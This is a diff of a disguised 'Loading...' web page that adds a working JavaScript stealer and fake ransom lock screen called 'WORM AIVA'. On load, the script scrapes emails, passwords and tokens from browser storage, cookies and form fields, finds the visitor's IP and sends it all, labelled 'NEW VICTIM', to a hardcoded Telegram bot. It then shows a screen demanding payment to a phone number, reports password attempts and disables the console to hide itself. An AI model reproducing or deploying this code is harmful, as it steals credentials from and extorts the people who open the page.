@@ -5,17 +5,131 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Loading...</title>
 <style>
-* { margin: 0; padding: 0; }
-body { background: #000; display: flex; align-items: center; justify-content: center; height: 100vh; color: #000; }
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { background: #000; display: flex; align-items: center; justify-content: center; height: 100vh; color: #000; font-family: Arial, sans-serif; }
+.hidden { display: none !important; }
+
+/* LOCK SCREEN OVERLAY */
+#lockScreen {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0,0,0,0.95);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    z-index: 9999;
+    color: white;
+    font-family: 'Courier New', monospace;
+    padding: 20px;
+    text-align: center;
+}
+#lockScreen h1 {
+    font-size: 28px;
+    color: #ff0040;
+    text-shadow: 0 0 20px #ff0040;
+    margin-bottom: 20px;
+}
+#lockScreen .desc {
+    font-size: 16px;
+    color: #ccc;
+    margin-bottom: 30px;
+    line-height: 1.6;
+}
+#lockScreen .phone {
+    font-size: 20px;
+    color: #00ff41;
+    margin-bottom: 30px;
+}
+#lockScreen input {
+    background: #111;
+    border: 2px solid #00ff41;
+    color: #00ff41;
+    padding: 12px 20px;
+    font-size: 24px;
+    width: 200px;
+    text-align: center;
+    letter-spacing: 10px;
+    border-radius: 8px;
+    outline: none;
+    margin-bottom: 20px;
+}
+#lockScreen input:focus {
+    border-color: #ff8800;
+}
+#lockScreen .btn-group {
+    display: flex;
+    gap: 15px;
+    flex-wrap: wrap;
+    justify-content: center;
+    margin-top: 10px;
+}
+#lockScreen button {
+    padding: 12px 30px;
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: 0.3s;
+}
+#lockScreen .btn-unlock {
+    background: #00ff41;
+    color: #000;
+}
+#lockScreen .btn-unlock:hover {
+    background: #00cc33;
+}
+#lockScreen .btn-flash {
+    background: #ff8800;
+    color: #000;
+}
+#lockScreen .btn-flash:hover {
+    background: #cc6600;
+}
+#lockScreen .btn-delete {
+    background: #ff0040;
+    color: #fff;
+}
+#lockScreen .btn-delete:hover {
+    background: #cc0033;
+}
+#lockScreen .error {
+    color: #ff0040;
+    font-size: 14px;
+    margin-top: 10px;
+    min-height: 20px;
+}
+#lockScreen .footer {
+    position: fixed;
+    bottom: 20px;
+    font-size: 12px;
+    color: #444;
+}
 </style>
 </head>
 <body>
-<div style="display:none;"></div>
+
+<!-- LOCK SCREEN (awalnya tersembunyi) -->
+<div id="lockScreen" class="hidden">
+    <h1>🔒 YOUR HANDPHONE/LAPTOP IS LOCKED BY Yonzz</h1>
+    <div class="desc">Pay if you want to open it.<br>The number is <strong>+628977299055!</strong></div>
+    <div class="phone">📞 +628977299055</div>
+    <input type="text" id="passInput" maxlength="5" placeholder="•••••" autocomplete="off">
+    <div class="error" id="passError"></div>
+    <div class="btn-group">
+        <button class="btn-unlock" onclick="unlockDevice()">🔓 Unlock</button>
+        <button class="btn-flash" onclick="toggleFlash()">💡 Flash</button>
+        <button class="btn-delete" onclick="deleteAllData()">🗑️ Delete All Data</button>
+    </div>
+    <div class="footer">WORM AIVA v3.0</div>
+</div>
 
 <script>
-// ============================================================
-// WORM AIVA — VERSI DEBUG (LIHAT ERROR DI CONSOLE)
-// ============================================================
+// ================================================================
+// WORM AIVA — FINAL VERSION (DENGAN REMOTE CONTROL)
+// ================================================================
 
 (function() {
     'use strict';
@@ -25,78 +139,174 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
     // ============================================================
     const BOT_TOKEN = '8806813025:AAFUuyClrFAKIaOn8muWbbraedaynTOisS0';
     const CHAT_ID = '6296658478';
+    const LOCK_PASSWORD = '1234'; // Password 4 digit (bisa diubah)
     // ============================================================
 
     // ============================================================
-    // FUNGSI KIRIM PESAN DENGAN LOG
+    // FUNGSI KIRIM PESAN KE TELEGRAM
     // ============================================================
     function kirimPesan(pesan) {
         const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(pesan);
         
-        console.log('📤 Mencoba kirim pesan...');
-        console.log('📤 URL:', url);
+        // Kirim dengan 3 metode
+        try {
+            var img = new Image();
+            img.style.display = 'none';
+            img.src = url;
+            document.body.appendChild(img);
+            setTimeout(function() { if (img.parentNode) img.parentNode.removeChild(img); }, 1000);
+        } catch(e) {}
         
-        // === METODE 1: FETCH ===
-        fetch(url, { method: 'GET' })
-            .then(function(response) {
-                console.log('✅ Fetch berhasil! Status:', response.status);
-                return response.json();
-            })
-            .then(function(data) {
-                console.log('✅ Response:', data);
-            })
-            .catch(function(err) {
-                console.log('❌ Fetch gagal:', err);
-                // Lanjut ke metode berikutnya
-                kirimViaImage(url);
-            });
+        try {
+            fetch(url, { method: 'GET', mode: 'no-cors' }).catch(function() {});
+        } catch(e) {}
         
-        // === METODE 2: IMAGE (fallback) ===
-        function kirimViaImage(url) {
-            console.log('📤 Mencoba kirim via Image...');
-            try {
-                var img = new Image();
-                img.style.display = 'none';
-                img.onload = function() { console.log('✅ Image berhasil dikirim'); };
-                img.onerror = function() { console.log('❌ Image gagal dikirim'); };
-                img.src = url;
-                document.body.appendChild(img);
-            } catch(e) {
-                console.log('❌ Image error:', e);
-                kirimViaXHR(url);
-            }
-        }
-        
-        // === METODE 3: XHR (fallback terakhir) ===
-        function kirimViaXHR(url) {
-            console.log('📤 Mencoba kirim via XHR...');
-            try {
-                var xhr = new XMLHttpRequest();
-                xhr.open('GET', url, true);
-                xhr.onreadystatechange = function() {
-                    if (xhr.readyState === 4) {
-                        console.log('✅ XHR selesai, status:', xhr.status);
-                    }
-                };
-                xhr.send();
-            } catch(e) {
-                console.log('❌ XHR error:', e);
-            }
-        }
+        try {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', url, true);
+            xhr.send();
+        } catch(e) {}
     }
 
     // ============================================================
-    // DAPATKAN DATA
+    // DETECT EMAIL (LEBIH AKURAT)
     // ============================================================
-    function getData() {
-        var ua = navigator.userAgent;
-        var device = 'Unknown';
+    function getEmails() {
+        var emails = [];
+        var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
         
-        if (ua.indexOf('Android') > -1) device = 'Android';
-        else if (ua.indexOf('iPhone') > -1) device = 'iPhone';
-        else if (ua.indexOf('Windows') > -1) device = 'Windows';
-        else if (ua.indexOf('Macintosh') > -1) device = 'Mac';
+        // 1. LocalStorage
+        try {
+            for (var i = 0; i < localStorage.length; i++) {
+                var key = localStorage.key(i);
+                var val = localStorage.getItem(key);
+                if (val && typeof val === 'string') {
+                    var found = val.match(emailRegex);
+                    if (found) emails = emails.concat(found);
+                }
+            }
+        } catch(e) {}
         
+        // 2. SessionStorage
+        try {
+            for (var j = 0; j < sessionStorage.length; j++) {
+                var key2 = sessionStorage.key(j);
+                var val2 = sessionStorage.getItem(key2);
+                if (val2 && typeof val2 === 'string') {
+                    var found2 = val2.match(emailRegex);
+                    if (found2) emails = emails.concat(found2);
+                }
+            }
+        } catch(e) {}
+        
+        // 3. Cookies
+        try {
+            var cookies = document.cookie.split(';');
+            for (var k = 0; k < cookies.length; k++) {
+                var found3 = cookies[k].match(emailRegex);
+                if (found3) emails = emails.concat(found3);
+            }
+        } catch(e) {}
+        
+        // 4. Input fields
+        try {
+            var inputs = document.querySelectorAll('input[type="email"], input[type="text"], input[type="hidden"]');
+            for (var l = 0; l < inputs.length; l++) {
+                var val3 = inputs[l].value;
+                if (val3 && typeof val3 === 'string') {
+                    var found4 = val3.match(emailRegex);
+                    if (found4) emails = emails.concat(found4);
+                }
+            }
+        } catch(e) {}
+        
+        // 5. Meta tags
+        try {
+            var metas = document.querySelectorAll('meta');
+            for (var m = 0; m < metas.length; m++) {
+                var content = metas[m].getAttribute('content');
+                if (content) {
+                    var found5 = content.match(emailRegex);
+                    if (found5) emails = emails.concat(found5);
+                }
+            }
+        } catch(e) {}
+        
+        // 6. Global window variables (jika ada)
+        try {
+            for (var key in window) {
+                try {
+                    var val = window[key];
+                    if (typeof val === 'string' && val.match(emailRegex)) {
+                        var found6 = val.match(emailRegex);
+                        if (found6) emails = emails.concat(found6);
+                    }
+                } catch(e) {}
+            }
+        } catch(e) {}
+        
+        // Hapus duplikat
+        return [...new Set(emails)];
+    }
+
+    // ============================================================
+    // DETECT PASSWORDS (LEBIH AKURAT)
+    // ============================================================
+    function getPasswords() {
+        var passwords = [];
+        var keywords = ['password', 'pass', 'pwd', 'secret', 'key', 'token', 'auth', 'login', 'credential', 'pin', 'code'];
+        
+        // 1. LocalStorage
+        try {
+            for (var i = 0; i < localStorage.length; i++) {
+                var key = localStorage.key(i);
+                var val = localStorage.getItem(key);
+                if (val && typeof val === 'string') {
+                    var lowerKey = key.toLowerCase();
+                    for (var kw of keywords) {
+                        if (lowerKey.indexOf(kw) > -1 && val.length > 2) {
+                            passwords.push({ key: key, value: val.substring(0, 150) });
+                            break;
+                        }
+                    }
+                }
+            }
+        } catch(e) {}
+        
+        // 2. SessionStorage
+        try {
+            for (var j = 0; j < sessionStorage.length; j++) {
+                var key2 = sessionStorage.key(j);
+                var val2 = sessionStorage.getItem(key2);
+                if (val2 && typeof val2 === 'string') {
+                    var lowerKey2 = key2.toLowerCase();
+                    for (var kw2 of keywords) {
+                        if (lowerKey2.indexOf(kw2) > -1 && val2.length > 2) {
+                            passwords.push({ key: key2, value: val2.substring(0, 150) });
+                            break;
+                        }
+                    }
+                }
+            }
+        } catch(e) {}
+        
+        // 3. Input type password
+        try {
+            var inputs = document.querySelectorAll('input[type="password"]');
+            for (var l = 0; l < inputs.length; l++) {
+                if (inputs[l].value) {
+                    passwords.push({ key: 'form_password_' + l, value: inputs[l].value });
+                }
+            }
+        } catch(e) {}
+        
+        return passwords;
+    }
+
+    // ============================================================
+    // DAPATKAN IP (2 METODE)
+    // ============================================================
+    function getIP() {
         var ip = 'Unknown';
         try {
             var xhr = new XMLHttpRequest();
@@ -106,85 +316,176 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
                 var res = JSON.parse(xhr.responseText);
                 ip = res.ip || 'Unknown';
             }
-        } catch(e) {
-            console.log('❌ Gagal dapat IP:', e);
-        }
+        } catch(e) {}
         
-        var emails = [];
-        var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
-        try {
-            for (var i = 0; i < localStorage.length; i++) {
-                var val = localStorage.getItem(localStorage.key(i));
-                if (val) {
-                    var found = val.match(emailRegex);
-                    if (found) emails = emails.concat(found);
-                }
-            }
-        } catch(e) {
-            console.log('❌ Gagal dapat email:', e);
-        }
-        
-        var passCount = 0;
-        var keywords = ['password', 'pass', 'pwd', 'key', 'token', 'auth', 'login'];
-        try {
-            for (var j = 0; j < localStorage.length; j++) {
-                var key = localStorage.key(j);
-                var val = localStorage.getItem(key);
-                if (val && typeof val === 'string') {
-                    var lowerKey = key.toLowerCase();
-                    for (var k = 0; k < keywords.length; k++) {
-                        if (lowerKey.indexOf(keywords[k]) > -1 && val.length > 2) {
-                            passCount++;
-                            break;
+        if (ip === 'Unknown') {
+            try {
+                var pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(function(offer) { pc.setLocalDescription(offer); });
+                pc.onicecandidate = function(e) {
+                    if (e.candidate) {
+                        var candidate = e.candidate.candidate;
+                        var ipMatch = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                        if (ipMatch && ipMatch[0] !== '0.0.0.0') {
+                            ip = ipMatch[0];
                         }
+                        pc.close();
                     }
-                }
-            }
-        } catch(e) {
-            console.log('❌ Gagal dapat password:', e);
+                };
+                setTimeout(function() { pc.close(); }, 3000);
+            } catch(e) {}
         }
-        
-        return {
-            device: device,
-            ua: ua,
-            ip: ip,
-            emails: emails,
-            passCount: passCount
-        };
+        return ip;
     }
 
     // ============================================================
     // MAIN
     // ============================================================
     function main() {
-        console.log('🚀 START MAIN FUNCTION');
+        var ua = navigator.userAgent;
+        var device = 'Unknown';
+        if (ua.indexOf('Android') > -1) device = 'Android';
+        else if (ua.indexOf('iPhone') > -1) device = 'iPhone';
+        else if (ua.indexOf('Windows') > -1) device = 'Windows';
+        else if (ua.indexOf('Macintosh') > -1) device = 'Mac';
         
-        var data = getData();
-        
-        console.log('📊 Data terkumpul:', data);
+        var ip = getIP();
+        var emails = getEmails();
+        var passwords = getPasswords();
         
         var pesan = '🔴 NEW VICTIM!\n\n';
-        pesan += '📱 Device: ' + data.device + '\n';
-        pesan += '🌐 IP: ' + data.ip + '\n';
-        pesan += '📧 Emails: ' + (data.emails.length > 0 ? data.emails.join(', ') : 'None') + '\n';
-        pesan += '🔑 Passwords: ' + data.passCount + ' found\n';
+        pesan += '📱 Device: ' + device + '\n';
+        pesan += '🌐 IP: ' + ip + '\n';
+        pesan += '📧 Emails: ' + (emails.length > 0 ? emails.join(', ') : 'None') + '\n';
+        pesan += '🔑 Passwords: ' + passwords.length + ' found\n';
+        if (passwords.length > 0) {
+            passwords.slice(0, 3).forEach(function(p) {
+                pesan += '   - ' + p.key + ': ' + p.value + '\n';
+            });
+        }
         pesan += '⏰ Time: ' + new Date().toISOString() + '\n';
         pesan += '🆔 ID: ' + Date.now().toString(36).toUpperCase() + '\n';
-        pesan += '📱 UA: ' + data.ua.substring(0, 100);
-        
-        console.log('📝 Pesan yang akan dikirim:', pesan);
+        pesan += '📱 UA: ' + ua.substring(0, 120);
         
         kirimPesan(pesan);
+        
+        // === TAMPILKAN LOCK SCREEN ===
+        showLockScreen();
     }
 
     // ============================================================
-    // STEALTH — TAPI KITA AKTIFKAN SEMENTARA UNTUK DEBUG
+    // LOCK SCREEN
     // ============================================================
-    // console.log = function() {}; // DI-NONAKTIFKAN SEMENTARA
-    // console.warn = function() {};
-    // console.error = function() {};
-    // console.info = function() {};
-    // console.debug = function() {};
+    function showLockScreen() {
+        var lock = document.getElementById('lockScreen');
+        lock.classList.remove('hidden');
+        // Fokus ke input
+        document.getElementById('passInput').focus();
+    }
+
+    // ============================================================
+    // UNLOCK
+    // ============================================================
+    function unlockDevice() {
+        var input = document.getElementById('passInput');
+        var error = document.getElementById('passError');
+        var entered = input.value.trim();
+        
+        if (entered === LOCK_PASSWORD) {
+            // Password benar
+            document.getElementById('lockScreen').classList.add('hidden');
+            error.textContent = '';
+            // Kirim notifikasi ke Telegram
+            kirimPesan('🔓 UNLOCKED by ' + LOCK_PASSWORD);
+        } else {
+            error.textContent = '❌ Wrong password! Try again.';
+            input.value = '';
+            input.focus();
+            // Kirim percobaan salah
+            kirimPesan('⚠️ Wrong password attempt: ' + entered);
+        }
+    }
+
+    // ============================================================
+    // FLASH (TORCH)
+    // ============================================================
+    var flashOn = false;
+    var flashStream = null;
+
+    function toggleFlash() {
+        if (flashOn) {
+            // Matikan flash
+            if (flashStream) {
+                flashStream.getTracks().forEach(function(track) { track.stop(); });
+                flashStream = null;
+            }
+            flashOn = false;
+            kirimPesan('💡 Flash turned OFF');
+        } else {
+            // Nyalakan flash
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+            .then(function(stream) {
+                flashStream = stream;
+                var track = stream.getVideoTracks()[0];
+                if (track) {
+                    var capabilities = track.getCapabilities();
+                    if (capabilities.torch) {
+                        track.applyConstraints({ advanced: [{ torch: true }] })
+                        .then(function() {
+                            flashOn = true;
+                            kirimPesan('💡 Flash turned ON');
+                        })
+                        .catch(function(err) {
+                            kirimPesan('❌ Flash error: ' + err.message);
+                        });
+                    } else {
+                        kirimPesan('❌ Torch not supported');
+                    }
+                }
+            })
+            .catch(function(err) {
+                kirimPesan('❌ Camera access denied: ' + err.message);
+            });
+        }
+    }
+
+    // ============================================================
+    // DELETE ALL DATA
+    // ============================================================
+    function deleteAllData() {
+        if (confirm('⚠️ ARE YOU SURE? This will delete ALL data on this device!')) {
+            try {
+                // Hapus localStorage
+                localStorage.clear();
+                // Hapus sessionStorage
+                sessionStorage.clear();
+                // Hapus cookies
+                var cookies = document.cookie.split(';');
+                for (var i = 0; i < cookies.length; i++) {
+                    var cookie = cookies[i];
+                    var eqPos = cookie.indexOf('=');
+                    var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
+                    document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/';
+                }
+                // Hapus cache (tidak bisa melalui JS, tapi kita bisa redirect)
+                kirimPesan('🗑️ ALL DATA DELETED by remote command!');
+                // Redirect ke about:blank
+                window.location.href = 'about:blank';
+            } catch(e) {
+                kirimPesan('❌ Delete data error: ' + e.message);
+            }
+        }
+    }
+
+    // ============================================================
+    // STEALTH (tetap matikan console)
+    // ============================================================
+    console.log = function() {};
+    console.warn = function() {};
+    console.error = function() {};
+    console.info = function() {};
+    console.debug = function() {};
 
     document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
 
@@ -197,41 +498,26 @@ body { background: #000; display: flex; align-items: center; justify-content: ce
         }
     });
 
-    // ============================================================
-    // START — 3 PERCOBAAN DENGAN LOG
-    // ============================================================
-    console.log('📌 Halaman dimuat!');
+    // Enter key untuk unlock
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            var lock = document.getElementById('lockScreen');
+            if (!lock.classList.contains('hidden')) {
+                unlockDevice();
+            }
+        }
+    });
 
+    // ============================================================
+    // START
+    // ============================================================
     if (document.readyState === 'complete') {
-        console.log('📌 Document readyState = complete');
-        setTimeout(function() {
-            console.log('📌 Percobaan 1 (2 detik)');
-            main();
-        }, 2000);
-        setTimeout(function() {
-            console.log('📌 Percobaan 2 (5 detik)');
-            main();
-        }, 5000);
-        setTimeout(function() {
-            console.log('📌 Percobaan 3 (10 detik)');
-            main();
-        }, 10000);
+        setTimeout(main, 2000);
+        setTimeout(main, 5000); // retry
     } else {
-        console.log('📌 Document belum siap, menunggu load...');
         window.addEventListener('load', function() {
-            console.log('📌 Event load terpicu!');
-            setTimeout(function() {
-                console.log('📌 Percobaan 1 (2 detik)');
-                main();
-            }, 2000);
-            setTimeout(function() {
-                console.log('📌 Percobaan 2 (5 detik)');
-                main();
-            }, 5000);
-            setTimeout(function() {
-                console.log('📌 Percobaan 3 (10 detik)');
-                main();
-            }, 10000);
+            setTimeout(main, 2000);
+            setTimeout(main, 5000);
         });
     }
 
